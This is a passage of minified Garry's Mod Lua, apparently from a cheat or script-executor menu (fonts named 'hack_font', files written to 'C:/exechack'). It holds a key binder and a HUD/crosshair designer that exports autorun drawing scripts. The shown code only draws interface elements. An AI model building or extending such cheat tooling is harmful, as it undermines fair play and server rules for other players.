aG=vgui.Create("DBinder",ax)aG:SetFont("hack_font_18")aG:SetText(input.GetKeyName(t[aw])or"None")aG:SetTextColor(b.colortext)aG:SetSize(aF,25)aG:SetSize(select(1,surface.GetTextSize(input.GetKeyName(t[aw])or"None"))+10,25)aG:SetPos(m,ad)if ay then aG:SetToolTip(ay)end;aG.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)if aG.Hovered then draw.RoundedBox(0,0,0,a9,aa,b.buttonhovered)end end;aG.OnChange=function(aH)z(aw,aH:GetValue())aG:SetSize(select(1,surface.GetTextSize(aG:GetText()))+10,25)end end;local function aI(K,aJ,Y,a6)surface.SetFont("hack_font_16")local aK=vgui.Create("DButton",a6)aK:SetSize(select(1,surface.GetTextSize(K)),15)aK:SetPos(aJ,Y-1)aK:SetFont("hack_font_16")aK:SetText(K)aK:SetTextColor(b.colortext)aK.Paint=function()end end;local function aL(K,aJ,Y,a6)surface.SetFont("hack_font_18")local aK=vgui.Create("DButton",a6)aK:SetSize(select(1,surface.GetTextSize(K)),15)aK:SetPos(aJ,Y)aK:SetFont("hack_font_18")aK:SetText(K)aK:SetTextColor(b.colortext)aK.Paint=function()end end;local function aM()local HD=HD or{}local aN=Material("vgui/hud_designer/grabber.png")surface.CreateFont("HD_Title",{font="Roboto Lt",size=20,weight=500,antialias=true})surface.CreateFont("HD_Smaller",{font="Roboto Lt",size=14,weight=500,antialias=true})surface.CreateFont("HD_Button",{font="Roboto Lt",size=16,weight=500,antialias=true})surface.CreateFont("Arial24",{font="Arial",size=24,weight=500,antialias=true})function HD.OpenDesigner(aO)if HD.DesignerOpen then if IsValid(HD.Frame)then HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;return end end;HD.UseAutosave=false;HD.AutosaveMinShapes=5;HD.AutosaveIncrement=120;HD.DefaultCorner=4;HD.GridEnabled=false;HD.GridSize=2;HD.DefaultCol=Color(41,128,185,255)HD.ScalePos=true;HD.ScaleSize=false;HD.Types={"draw.RoundedBox","draw.DrawText","surface.DrawTexturedRect"}HD.FormatTypes={["Health"]={text="%health%",code="lp:Health()"},["Ammo Max"]={text="%ammomax%",code="wep.Primary.ClipSize or 0"},["Ammo Current"]={text="%ammocur%",code="wep:Clip1() or 0"},["Ammo Reserve"]={text="%ammores%",code="wep:Ammo1() or 0"},["Armor"]={text="%armor%",code="lp:Armor()"},["Team"]={text="%team%",code="lp:Team()"},["Name"]={text="%name%",code="lp:Nick()"},["TTT - Round State"]={text="%tttround%",code="L[ roundstate_string[GAMEMODE.round_state] ]"},["TTT - Round Time"]={text="%ttttime%",code='util.SimpleTime(math.max(0, GetGlobalFloat("ttt_round_end", 0) - CurTime()), "%02i:%02i")'},["TTT - Role"]={text="%tttrole%",code="L[lp:GetRoleStringRaw()]"},["RP - Salary"]={text="%rpsalary%",code='DarkRP.getPhrase("salary", DarkRP.formatMoney(lp:getDarkRPVar("salary")), "")'},["RP - Job"]={text="%rpjob%",code='DarkRP.getPhrase("job", lp:getDarkRPVar("job") or "")'},["RP - Money"]={text="%rpmoney%",code='DarkRP.getPhrase("wallet", DarkRP.formatMoney(localplayer:getDarkRPVar("money")), "")'},["None"]={text="N/A",code="N/A"}}HD.Tools={["Create"]=1,["Layers"]=2,["Color"]=3,["Select"]=4,["Grid"]=5,["Delete"]=6,["Save"]=7,["Close"]=8}HD.Boundaries={}HD.DrawnObjects={}HD.ShapesOnLayer={}for aP,m in pairs(HD.Types)do HD.DrawnObjects[1]={}HD.DrawnObjects[1][m]={}end;HD.SelectedButton=nil;HD.CurTool=HD.Tools.Box;HD.CurType=HD.Types[1]HD.ShapeID=1;HD.ShapeCount=1;HD.CurLayer=1;HD.Layers=1;HD.Cursor="arrow"HD.ProjectName="Project Name"HD.FAKE_TEXTURE="vgui/nonexistant.png"HD.Y_BUFFER=35;HD.ScaleSize,HD.ScalePos=false;HD.ChosenCol,HD.ColMixer,HD.GridEditor,HD.LoadSel,HD.CreateOpen,HD.CurSizeID=nil;HD.LayerView,HD.LayerOpen,HD.GridOpen,HD.LoadOpen,HD.ColMixerOpen,HD.CreatePanel=false;HD.Sizing,HD.Moving,HD.ClickColor=false;HD.CurMovingData={}HD.ShapeOptions={}HD.Frame=vgui.Create("DFrame")HD.Frame:SetSize(ScrW(),ScrH())HD.Frame:SetPos(0,0)HD.Frame:SetTitle("")HD.Frame:MakePopup()HD.Frame:SetDraggable(false)HD.Frame.btnMaxim:SetVisible(false)HD.Frame.btnMinim:SetVisible(false)HD.Frame.btnClose:SetVisible(false)HD.Frame.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,ScrW(),35,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,ScrW(),35)end;local aQ=vgui.Create("DLabel",HD.Frame)aQ:SetPos(10,8)aQ:SetSize(30,0)aQ:SetColor(Color(255,255,255))aQ:SetFont("HD_Title")aQ:SetText("")aQ:SizeToContents()HD.DesignerOpen=true;HD.IconLayout=vgui.Create("DIconLayout",HD.Frame)HD.IconLayout:SetSize(700,25)HD.IconLayout:SetPos(ScrW()/2-HD.IconLayout:GetWide()/2,5)HD.IconLayout:SetSpaceY(5)HD.IconLayout:SetSpaceX(5)HD.ToolbarButtons={}local d=1;for d=1,table.Count(HD.Tools)do local aP,m;for aR,aS in pairs(HD.Tools)do if aS==d then aP=aR;m=aS end end;HD.ToolbarButtons[aP]=HD.IconLayout:Add("DButton")HD.ToolbarButtons[aP]:SetSize(54,29)HD.ToolbarButtons[aP]:SetText(aP)HD.ToolbarButtons[aP]:SetTextColor(Color(255,255,255))HD.ToolbarButtons[aP]:SetFont("hack_font_18")HD.ToolbarButtons[aP].DoClick=function()HD.SetTool(m,aP)HD.ToolFunctions(m)end;HD.ToolbarButtons[aP].Paint=function(h,a9,aa)draw.RoundedBox(0,0,0,a9,aa,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9,aa)end end;HD.IconLayout:SetPos(ScrW()/2-HD.IconLayout:GetWide()/2,3)local aT,aU=HD.IconLayout:GetPos()HD.Canvas=vgui.Create("DPanel",HD.Frame)HD.Canvas:SetSize(ScrW()-0,ScrH()-30)HD.Canvas:SetPos(0,HD.Y_BUFFER)local aV=0;function HD.Canvas:PaintOver(ad,ae)local d=1;for d=1,HD.Layers do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}for aW,aX in pairs(HD.DrawnObjects[d])do if aW=="draw.RoundedBox"then for aY,aZ in pairs(aX)do if HD.LayerView then local a_=nil;local a9,T,R,a=aZ.color.r,aZ.color.g,aZ.color.b,aZ.color.a;if d==HD.CurLayer then a_=Color(a9,T,R,a)else a=math.Clamp(a-100,100,255)a_=Color(a9,T,R,a)end;draw.RoundedBox(aZ.corner,aZ.x,aZ.y,aZ.width,aZ.height,a_)draw.DrawText(HD.GetShapeLayer(aY)or"","Trebuchet24",aZ.x+5,aZ.y,Color(255,255,255))else draw.RoundedBox(aZ.corner,aZ.x,aZ.y,aZ.width,aZ.height,aZ.color)end end elseif aW=="surface.DrawTexturedRect"then for aY,aZ in pairs(aX)do local color=aZ.color;if color==HD.DefaultCol then color=Color(255,255,255)end;if type(aZ.texture)=="IMaterial"then surface.SetMaterial(aZ.texture)surface.SetDrawColor(color)surface.DrawTexturedRect(aZ.x,aZ.y,aZ.width,aZ.height)else surface.SetTexture(aZ.texture)surface.SetDrawColor(color)surface.DrawTexturedRect(aZ.x,aZ.y,aZ.width,aZ.height)end end elseif aW=="draw.DrawText"then for aY,aZ in pairs(aX)do draw.DrawText(aZ.text,aZ.font,aZ.x,aZ.y,aZ.color)end else end end end;for aY,m in pairs(HD.Boundaries)do if not HD.GetShapeType(aY)=="draw.DrawText"and HD.GetShapeLayer(aY)==HD.CurLayer then local b0=20;local b1,b2=m.farx,m.fary;local b3,b4=b1-b0,b2-b0;local ay,aA=b3,b4;local width,height=b1-b3,b2-b4;surface.SetDrawColor(150,150,150)surface.SetMaterial(aN)surface.DrawTexturedRect(ay+5,aA+5,width-10,height-10)end end end;HD.Canvas.Paint=function()if HD.GridEnabled then for d=HD.GridSize,ScrW(),HD.GridSize do surface.DrawLine(d,0,d,ScrH())surface.DrawLine(0,d,ScrW(),d)end end;local aC=ScrH()/2-35;local aB=ScrW()/2;local b5=1500;surface.SetDrawColor(Color(255,255,255))surface.DrawLine(aB+b5,aC,aB-b5,aC)surface.DrawLine(aB,aC+b5,aB,aC-b5)end;HD.Canvas.OnMousePressed=function(self,b6)local b7,b8=HD.GetMousePos()if b6==MOUSE_LEFT then local b9,aY=HD.IsInShape(b7,b8)local ba=HD.GetShapeLayer(aY)local bb=HD.GetShapeType(aY)if HD.ClickColor then if b9 then local a_=HD.DrawnObjects[ba][bb][aY].color;HD.Mixer:SetColor(a_)HD.ChosenCol=a_;HD.ClickColor=false;return end elseif HD.CurTool==HD.Tools.Color then if b9 then local bc=HD.ChosenCol;HD.DrawnObjects[ba][bb][aY].color=bc;return end elseif HD.CurTool==HD.Tools.Delete then if b9 then HD.DrawnObjects[ba][bb][aY]=nil;HD.Boundaries[aY]=nil;HD.CancelAlter()HD.ShapeCount=HD.ShapeCount-1;return end end;HD.CloseOpenInfoPanels()if b9 then if HD.IsInSize(aY,b7,b8)then HD.SetTool(HD.Tools.Select,"Select")HD.CurMovingData={}HD.Moving=false;local bd=HD.DrawnObjects[ba][HD.GetShapeType(aY)][aY]if bd then HD.CurSizeID=aY;HD.Sizing=true end else HD.SetTool(HD.Tools.Select,"Select")HD.CurSizeID=nil;HD.Sizing=false;local be,aY,bf,bg=HD.IsInShape(b7,b8)HD.CurMovingData={id=aY,x=bf,y=bg}HD.Moving=true end else HD.CancelAlter()end elseif b6==MOUSE_RIGHT then local b9,aY=HD.IsInShape(b7,b8)if not b9 then return end;HD.SetTool(HD.Tools.Select,"Select")HD.OpenShapeSettings(aY,b7,b8)end end;local bh,aV=CurTime()+30,0;HD.Canvas.Think=function(self)if CurTime()>aV then if HD.UseAutosave and CurTime()>bh and HD.ShapeCount>HD.AutosaveMinShapes then HD.Autosave()bh=CurTime()+HD.AutosaveIncrement end;HD.DrawnObjects=HD.DrawnObjects or{}HD.Layers=table.Count(HD.DrawnObjects)local d=1;for d=1,HD.Layers do local bi=0;for aP,m in pairs(HD.DrawnObjects[d])do bi=bi+table.Count(m)end;HD.ShapesOnLayer[d]=bi end;aV=CurTime()+1 end;local b7,b8=HD.GetMousePos()local bj=HD.IsInCanvas(b7,b8)local bk,aY=HD.IsInShape(b7,b8)if not bj then HD.CancelAlter()return elseif bk or HD.Moving and input.IsMouseDown(MOUSE_LEFT)then HD.Cursor="hand"else HD.Cursor="arrow"end;HD.Canvas:SetCursor(HD.Cursor)if HD.Moving and input.IsMouseDown(MOUSE_LEFT)then local bl,bm=b7,b8;if bj then local S=HD.CurMovingData;local aY,bf,bg=S.id,S.x,S.y;local b0=HD.GridSize;local bn,bo=b0/2,b0*1.5;bl,bm=math.SnapTo(bl-bf+bn,b0),math.SnapTo(bm-bg-bo,b0)HD.EditShape(aY,{x=bl,y=bm},"move")end elseif HD.Sizing and input.IsMouseDown(MOUSE_LEFT)then local aY=HD.CurSizeID;local b0=HD.GridSize;local bd=HD.Boundaries[aY]if not bd then return end;local ay,aA=bd.x,bd.y;local b1,b2=bd.farx,bd.fary;local b3,b4=b1-b0,b2-b0;if HD.IsInCanvas then b7,b8=math.Clamp(b7,ay+5,ScrW()),math.Clamp(b8,aA+5,ScrH())HD.EditShape(aY,{width=b7-ay,height=b8-aA},"size")end end end end;function HD.ToolFunctions(bp)if bp==HD.Tools.Create then if HD.CreateOpen then HD.SetTool()HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil;return end;local bq,br=HD.IconLayout,HD.ToolbarButtons.Create;local bs,bt=br:GetPos()local bu,bv=bq:GetPos()bs,bt=bs+bu,bt+bv;local bw=0;if#HD.Types>3 then bw=55 end;HD.CreatePanel=vgui.Create("DPanel",HD.Frame)HD.CreatePanel:SetSize(180,70+bw)HD.CreatePanel:SetPos(bs-HD.CreatePanel:GetWide()/4,40)HD.CreatePanel.Paint=function(a8,a9,aa)local self=HD.CreatePanel;draw.RoundedBox(0,0,0,a9,aa,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9,aa)end;local bx=vgui.Create("DLabel",HD.CreatePanel)bx:SetPos(35,5)bx:SetColor(Color(255,255,255))bx:SetFont("HD_Smaller")bx:SetText("")bx:SizeToContents()local by=vgui.Create("DIconLayout",HD.CreatePanel)by:SetSize(HD.CreatePanel:GetSize())by:SetPos(10,10)by:SetSpaceY(5)by:SetSpaceX(5)local d=1;local bz=Material(HD.FAKE_TEXTURE)local bi=0;for d=1,#HD.Types do local bA=HD.Types[d]local bB=vgui.Create("DButton",by)bB:SetSize(50,50)bB:SetTextColor(Color(255,255,255))bB:SetFont("HD_Smaller")bB:SetText("")bB:SetTooltip(bA)bB.Paint=function()draw.RoundedBox(0,0,0,bB:GetWide(),bB:GetTall(),Color(255,255,255,255))if bA=="draw.RoundedBox"then draw.RoundedBox(8,5,5,40,40,Color(90,90,90,255))elseif bA=="draw.DrawText"then draw.DrawText("TEXT","HD_Title",5,15,Color(90,90,90,255))elseif bA=="surface.DrawTexturedRect"then surface.SetMaterial(bz)surface.SetDrawColor(255,255,255)surface.DrawTexturedRect(5,5,40,40)elseif bA=="surface.CreateFont"then draw.DrawText("Ff","HD_Title",16,15,Color(90,90,90,255))else end end;bB.DoClick=function()HD.SetType(bA)if bA=="draw.DrawText"then local font="Arial24"local text="Sample Text"local width,height=HD.GetTextSize(text,font)local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;HD.AddText(HD.ShapeID,ay,aA,text,font,color,HD.CurLayer)elseif bA=="draw.RoundedBox"then local width=200;local height=200;local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;HD.AddShape(HD.ShapeID,ay,aA,width,height,HD.ChosenCol,{corner=4},HD.CurLayer)elseif bA=="surface.DrawTexturedRect"then local width=200;local height=200;local ay,aA=HD.Canvas:GetWide()/2-width/2,HD.Canvas:GetTall()/2-height/2;local color=HD.ChosenCol;if color==HD.DefaultCol then color=Color(255,255,255)end;HD.AddShape(HD.ShapeID,ay,aA,width,height,color,{texture=bz},HD.CurLayer)elseif bA=="surface.CreateFont"then HD.FontCreator()else end;HD.SetTool(HD.Tools.Select,"Select")HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil end;bi=bi+1;if bi%3==0 and bi>3 then local width,height=HD.CreatePanel:GetSize()HD.CreatePanel:SetSize(180,height+55)end end;HD.CreateOpen=true elseif bp==HD.Tools.Color then HD.SetTool(HD.Tools.Color,"Color")if HD.ColMixerOpen then HD.SetTool(nil)HD.ColMixer:SetVisible(false)HD.ColMixerOpen=false;HD.ColMixer=nil;return end;local bq,br=HD.IconLayout,HD.ToolbarButtons.Color;local bs,bt=br:GetPos()local bu,bv=bq:GetPos()bs,bt=bs+bu,bt+bv;HD.ColMixer=vgui.Create("DPanel",HD.Frame)HD.ColMixer:SetSize(260,240)HD.ColMixer:SetPos(bs-HD.ColMixer:GetWide()/4,40)HD.ColMixer.Paint=function(a8,a9,aa)local self=HD.ColMixer;draw.RoundedBox(0,0,0,a9,aa,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9,aa)end;HD.Mixer=vgui.Create("DColorMixer",HD.ColMixer)HD.Mixer:SetSize(250,230)HD.Mixer:SetPos(5,5)HD.Mixer:SetPalette(false)HD.Mixer:SetAlphaBar(true)HD.Mixer:SetWangs(true)HD.Mixer:SetColor(HD.ChosenCol or HD.DefaultCol)HD.Mixer.Think=function()HD.ChosenCol=HD.Mixer:GetColor()end;local bC=vgui.Create("DButton",HD.ColMixer)bC:SetSize(50,25)bC:SetPos(HD.ColMixer:GetWide()-bC:GetWide()-5,HD.ColMixer:GetTall()-bC:GetTall()-20)bC:SetTextColor(Color(0,0,0))bC:SetTooltip("Click on a shape to use its color")bC:SetText("Picker")bC.DoClick=function()HD.ClickColor=true end;HD.ColMixerOpen=true elseif bp==HD.Tools.Grid then if HD.GridOpen then HD.SetTool(nil)HD.GridEditor:SetVisible(false)HD.GridOpen=false;HD.GridEditor=nil;return end;local bq,br=HD.IconLayout,HD.ToolbarButtons.Grid;local bs,bt=br:GetPos()local bu,bv=bq:GetPos()bs,bt=bs+bu,bt+bv;HD.GridEditor=vgui.Create("DPanel",HD.Frame)HD.GridEditor:SetSize(80,65)HD.GridEditor:SetPos(bs-HD.GridEditor:GetWide()/4,40)HD.GridEditor.Paint=function(a8,a9,aa)local self=HD.GridEditor;draw.RoundedBox(0,0,0,a9,aa,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9,aa)end;local bD=vgui.Create("DCheckBoxLabel",HD.GridEditor)bD:SetPos(5,40)bD:SetText("Enabled")bD:SetValue(HD.GridEnabled)bD:SizeToContents()bD.OnChange=function(self,aS)HD.GridEnabled=aS end;local bE=vgui.Create("DNumberWang",HD.GridEditor)bE:SetDecimals(0)bE:SetMinMax(2,50)bE:SetValue(HD.GridSize)bE:SetPos(5,5)bE:SetSize(70,25)bE.Think=function()if bE:GetValue()>=2 and bE:GetValue()<=50 then HD.GridSize=bE:GetValue()end end;bE.Up.DoClick=function(a2,bF)bE:SetValue(math.Clamp(bE:GetValue()+2,2,50))end;bE.Down.DoClick=function(a2,bF)bE:SetValue(math.Clamp(bE:GetValue()-2,2,50))end;HD.GridOpen=true elseif bp==HD.Tools.Layers then if HD.LayerOpen then HD.SetTool(nil)HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil;return end;local bq,br=HD.IconLayout,HD.ToolbarButtons.Layers;local bs,bt=br:GetPos()local bu,bv=bq:GetPos()bs,bt=bs+bu,bt+bv;local bG=1;if HD.Layers>2 then bG=2 end;HD.LayerSel=vgui.Create("DScrollPanel",HD.Frame)HD.LayerSel:SetSize(180,95*bG)HD.LayerSel:SetPos(bs-HD.LayerSel:GetWide()/4,40)HD.LayerSel.Paint=function()local self=HD.LayerSel;draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(39,174,96))end;HD.LayerSel.Paint=function(a8,a9,aa)local self=HD.LayerSel;draw.RoundedBox(0,0,0,a9,aa,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9,aa)end;local bx=vgui.Create("DLabel",HD.LayerSel)bx:SetPos(35,5)bx:SetColor(Color(255,255,255))bx:SetFont("HD_Smaller")bx:SetText("Current Layer: "..HD.CurLayer)bx:SizeToContents()bx.Think=function()bx:SetText("Current Layer: "..HD.CurLayer)end;local d=1;local bH=30;local bI=15;local bi={}for d=1,HD.Layers do bi[d]=0;local bJ=vgui.Create("DButton",HD.LayerSel)bJ:SetPos(10,bH)bJ:SetSize(HD.LayerSel:GetWide()-20-bI,50)bJ:SetTextColor(Color(255,255,255))bJ:SetFont("HD_Smaller")bJ.Paint=function()local a_=Color(90,90,90,200)if bi[d]==0 then a_.a=100 end;if HD.CurLayer==d then a_.a=255 else a_.a=200 end;draw.RoundedBox(0,0,0,bJ:GetWide(),bJ:GetTall(),a_)end;bJ.Think=function()if bi[d]==nil then bi[d]=0 end;bi[d]=HD.ShapesOnLayer[d]bJ:SetText("Layer: "..d.." Shapes: "..tostring(bi[d]))end;bJ.DoClick=function()HD.CurLayer=d;HD.LayerView=true end;bH=bH+bJ:GetTall()+20 end;local bK=vgui.Create("DButton",HD.LayerSel)bK:SetPos(10,bH)bK:SetSize(HD.LayerSel:GetWide()-20-bI,50)bK:SetTextColor(Color(255,255,255))bK:SetText("Add Layer")bK:SetFont("HD_Smaller")bK.Paint=function()local a_=Color(90,90,90,255)draw.RoundedBox(0,0,0,bK:GetWide(),bK:GetTall(),a_)end;bK.DoClick=function()HD.Layers=HD.Layers+1;HD.CurLayer=HD.Layers;local d=1;for d=1,HD.Layers do for aP,m in pairs(HD.Tools)do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}HD.DrawnObjects[d][m]=HD.DrawnObjects[d][m]or{}end end;HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil;HD.ToolFunctions(HD.Tools.Layers)end;HD.LayerOpen=true elseif bp==HD.Tools.Close then HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;HD.DesignerOpen=false;HD.Frame=nil;HD.CloseOpenInfoPanels()HD.Sizing,HD.Moving=false;HD.CurMovingData={}elseif bp==HD.Tools.Save then Derma_StringRequest("Custom Crosshair","Create lua file","",function(T)local bL='local lp=LocalPlayer();local wep=LocalPlayer():GetActiveWeapon();hook.Add("HUDPaint","'..T..'",function()\n'for layer,aY in pairs(HD.CreateExportCode())do for aP,m in pairs(aY)do bL=bL..m.."\n"end end;exec_Write("C:/exechack".."/"..T.."_autorun.lua",bL.."end)")HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;HD.DesignerOpen=false;HD.Frame=nil;HD.CloseOpenInfoPanels()HD.Sizing,HD.Moving=false;HD.CurMovingData={}end)end end;function HD.OpenShapeSettings(aY,b7,b8)if HD.ShapeOptions[aY]then HD.ShapeOptions[aY]:SetVisible(false)HD.ShapeOptions[aY]=nil end;HD.CancelAlter()HD.ShapeOptions=HD.ShapeOptions or{}local bM=HD.GetShapeData(aY)local bb=HD.GetShapeType(aY)local layer=HD.GetShapeLayer(aY)HD.ShapeOptions[aY]=vgui.Create("DFrame",HD.Frame)HD.ShapeOptions[aY]:SetSize(150,120)local ay,aA=math.Clamp(b7,0,ScrW()-HD.ShapeOptions[aY]:GetWide()),math.Clamp(b8,0,ScrH()-HD.ShapeOptions[aY]:GetTall())HD.ShapeOptions[aY]:SetPos(ay,aA)HD.ShapeOptions[aY]:SetTitle("")HD.ShapeOptions[aY]:SetDraggable(true)HD.ShapeOptions[aY].btnMaxim:SetVisible(false)HD.ShapeOptions[aY].btnMinim:SetVisible(false)HD.ShapeOptions[aY].btnClose:SetVisible(false)HD.ShapeOptions[aY].Paint=function()local self=HD.ShapeOptions[aY]draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(39,174,96))end;HD.ShapeOptions[aY].OnMousePressed=function()local self=HD.ShapeOptions[aY]HD.CurMovingData,HD.Moving,HD.CurSizeID,HD.Sizing={},false,nil,false;self.Dragging={gui.MouseX()-self.x,gui.MouseY()-self.y}self:MouseCapture(true)return end;local bN=vgui.Create("DButton",HD.ShapeOptions[aY])bN:SetText("X")bN:SetTextColor(Color(255,255,255,255))bN:SetPos(HD.ShapeOptions[aY]:GetWide()-45,5)bN:SetFont("HD_Button")bN:SetSize(40,20)bN.Paint=function()draw.RoundedBox(0,0,0,bN:GetWide(),bN:GetTall(),Color(200,79,79,255))end;bN.DoClick=function()HD.CurMovingData,HD.Moving,HD.CurSizeID,HD.Sizing={},false,nil,false;HD.ShapeOptions[aY]:Close()HD.ShapeOptions[aY]=nil end;local bO=vgui.Create("DNumberWang",HD.ShapeOptions[aY])bO:SetDecimals(0)bO:SetMinMax(1,500)bO:SetValue(HD.CurLayer)bO:SetPos(20,30)bO:SetSize(60,25)bO:SetTooltip("Change your shape's layer")bO.OnValueChanged=function()local bP=bO:GetValue()if bP==nil or bP==0 then return end;if HD.Layers<bP then HD.Layers=bP end;HD.EditShape(aY,{layer=HD.CurLayer,newlayer=bP},"layer")layer=HD.GetShapeLayer(aY)end;if bb=="draw.RoundedBox"then local bQ=vgui.Create("DNumberWang",HD.ShapeOptions[aY])bQ:SetDecimals(0)bQ:SetMinMax(0,40)bQ:SetValue(bM.corner)bQ:SetPos(20,80)bQ:SetSize(60,25)bQ:SetTooltip("Change your shape's corner size")bQ.OnValueChanged=function()local bP=bQ:GetValue()if bP==nil then return end;if bP~=bM.corner then HD.EditShape(aY,{corner=bP},"corner")end end;bQ.Up.DoClick=function(a2,bF)bQ:SetValue(bQ:GetValue()+2)end;bQ.Down.DoClick=function(a2,bF)bQ:SetValue(bQ:GetValue()-2)end elseif bb=="draw.DrawText"then local bR=vgui.Create("DTextEntry",HD.ShapeOptions[aY])bR:SetSize(80,25)bR:SetPos(20,80)bR:SetText(bM.text)bR:SetFont("HD_Button")bR:SetTooltip("Enter your text here")bR.OnChange=function(self,aS)HD.DrawnObjects[layer][bb][aY].text=self:GetText()local font=HD.DrawnObjects[layer][bb][aY].font;local width,height=HD.GetTextSize(self:GetText(),font)HD.DrawnObjects[layer][bb][aY].width,HD.DrawnObjects[layer][bb][aY].height=width,height;local bS=HD.Boundaries[aY]HD.Boundaries[aY].farx,HD.Boundaries[aY].fary=bS.x+width,bS.y+height end;local bT=vgui.Create("DTextEntry",HD.ShapeOptions[aY])bT:SetSize(80,25)bT:SetPos(20,130)bT:SetText(bM.font)bT:SetFont("HD_Button")bT:SetTooltip("Enter a valid font for your text")bT.OnEnter=function(self,aS)HD.DrawnObjects[layer][bb][aY].font=self:GetText()end;local bU=nil;HD.ShapeOptions[aY].Format=vgui.Create("DComboBox",HD.ShapeOptions[aY])HD.ShapeOptions[aY].Format:SetSize(80,25)HD.ShapeOptions[aY].Format:SetPos(20,180)for aP,m in pairs(HD.FormatTypes)do if m.code==HD.DrawnObjects[layer][bb][aY].format then bU=aP;break end end;HD.ShapeOptions[aY].Format:SetValue(bU or"Type")HD.ShapeOptions[aY].Format:SetFont("HD_Button")HD.ShapeOptions[aY].Format:SetTooltip("string.format Types")a={}for bV in pairs(HD.FormatTypes)do table.insert(a,bV)end;table.sort(a)for d,bV in ipairs(a)do HD.ShapeOptions[aY].Format:AddChoice(bV)end;HD.ShapeOptions[aY].Format.OnSelect=function(self,bW,B)local bX=HD.FormatTypes[B]if B=="None"then HD.ShapeOptions[aY].Format:SetValue("Type")HD.DrawnObjects[layer][bb][aY].format=nil;HD.DrawnObjects[layer][bb][aY].text="Sample Text"return end;HD.DrawnObjects[layer][bb][aY].text=bX.text;HD.DrawnObjects[layer][bb][aY].format=bX.code end elseif bb=="surface.DrawTexturedRect"then local bY=tostring(bM.texturestring or bM.texture)if bY=="___error"or bY==nil then bY="Image Path"end;local bZ=vgui.Create("DTextEntry",HD.ShapeOptions[aY])bZ:SetSize(80,25)bZ:SetPos(20,80)bZ:SetText(bY)bZ:SetFont("HD_Button")bZ:SetTooltip("Relative to the materials/ directory")bZ.OnEnter=function(self,aS)local b_=Material(self:GetText())HD.DrawnObjects[layer][bb][aY].texture=b_;HD.DrawnObjects[layer][bb][aY].texturestring=self:GetText()end end;local c0=vgui.Create("DLabel",HD.ShapeOptions[aY])c0:SetPos(5,10)c0:SetColor(Color(255,255,255))c0:SetFont("HD_Smaller")c0:SetText("Shape Layer:")c0:SizeToContents()local c1=vgui.Create("DLabel",HD.ShapeOptions[aY])c1:SetPos(5,60)c1:SetColor(Color(255,255,255))c1:SetFont("HD_Smaller")if bb=="draw.RoundedBox"then c1:SetText("Corner Size:")elseif bb=="draw.DrawText"then c1:SetText("Text:")elseif bb=="surface.DrawTexturedRect"then c1:SetText("Texture:")end;c1:SizeToContents()local c2=vgui.Create("DLabel",HD.ShapeOptions[aY])c2:SetPos(100,60)c2:SetColor(Color(255,255,255))c2:SetFont("HD_Smaller")c2:SetText("ID: "..aY)c2:SizeToContents()if bb=="draw.DrawText"then local c3=vgui.Create("DLabel",HD.ShapeOptions[aY])c3:SetPos(5,110)c3:SetColor(Color(255,255,255))c3:SetFont("HD_Smaller")c3:SetText("Font: ")c3:SizeToContents()local c4=vgui.Create("DLabel",HD.ShapeOptions[aY])c4:SetPos(5,160)c4:SetColor(Color(255,255,255))c4:SetFont("HD_Smaller")c4:SetText("Format: ")c4:SizeToContents()local ad,ae=HD.ShapeOptions[aY]:GetSize()HD.ShapeOptions[aY]:SetSize(ad,ae+100)end end;function HD.AddShape(aY,ay,aA,width,height,color,c5,layer)color=color or HD.DefaultCol;layer=layer or HD.CurLayer;HD.DrawnObjects[layer]=HD.DrawnObjects[HD.CurLayer]or{}HD.DrawnObjects[layer][HD.CurType]=HD.DrawnObjects[HD.CurLayer][HD.CurType]or{}ay,aA=math.SnapTo(ay,HD.GridSize),math.SnapTo(aA,HD.GridSize)width,height=math.SnapTo(width,HD.GridSize),math.SnapTo(height,HD.GridSize)if HD.CurType=="draw.RoundedBox"then HD.DrawnObjects[layer][HD.CurType][aY]={x=ay,y=aA,width=width,height=height,color=color,corner=c5.corner}elseif HD.CurType=="surface.DrawTexturedRect"then HD.DrawnObjects[layer][HD.CurType][aY]={x=ay,y=aA,width=width,height=height,color=color,texture=c5.texture}else end;HD.SetBoundaries(aY,ay,aA,width,height,layer)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end;function HD.AddText(aY,ay,aA,text,font,color,layer)layer=layer or HD.CurLayer;color=color or Color(0,0,0)HD.DrawnObjects[layer]=HD.DrawnObjects[layer]or{}HD.DrawnObjects[layer]["draw.DrawText"]=HD.DrawnObjects[layer]["draw.DrawText"]or{}if color==HD.DefaultCol then color=Color(0,0,0)end;ay,aA=math.SnapTo(ay,HD.GridSize),math.SnapTo(aA,HD.GridSize)HD.DrawnObjects[layer]["draw.DrawText"][aY]={x=ay,y=aA,text=text,font=font,color=color}local width,height=HD.GetTextSize(text,font)HD.SetBoundaries(aY,ay,aA,width,height,layer)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end;function 